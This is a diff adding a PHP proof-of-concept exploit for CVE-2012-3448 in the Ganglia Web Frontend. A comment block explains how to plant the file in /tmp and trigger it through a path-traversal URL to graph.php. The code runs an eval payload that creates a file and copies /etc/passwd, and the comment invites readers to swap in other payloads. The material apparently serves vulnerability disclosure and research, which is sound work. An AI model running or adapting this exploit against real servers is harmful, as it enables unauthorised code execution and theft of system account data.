@@ -1,0 +1,38 @@
+<?php
+/*
+
+################################################################################
+#
+# Author    : Andrei Costin (andrei theATsign firmware theDOTsign re)
+# Desc      : CVE-2012-3448 PoC
+# Details   : This PoC will create a dummy file in the /tmp folder and 
+#             will copy /etc/passwd to /tmp.
+#             To modify the attack payload, modify the code below.\
+# Setup     : Ubuntu Linux 14.04 LTS x86 with Ganglia Web Frontend 3.5.0
+#
+################################################################################
+
+1. Assuming that ganglia is installed on the target machine at this path:
+/var/www/html/ganglia/
+
+2. Assuming the attacker has minimal access to the target machine and 
+can write to "/tmp". There are several methods where a remote attacker can 
+also trigger daemons or other system processes to create files in "/tmp" 
+whose content is (partially) controlled by the remote attacker. 
+
+3. The attacker puts the contents of this PoC file into the file:
+/tmp/attack.php
+
+4. The attacker visits the Ganglia Web Frontend interface with version < 3.5.1 
+as:
+http://targetIP/ganglia/graph.php?g=../../../../tmp/attack&metric=DUMMY&title=DUMMY
+
+5. Confirm that the PoC created a dummy file in the /tmp folder and copied 
+/etc/passwd to /tmp.
+
+*/
+
+eval('touch("/tmp/attacker.touch"); copy("/etc/passwd", "/tmp/attacker.passwd");');
+die("Triggering CVE-2012-3448 attack.php");
+
+?>
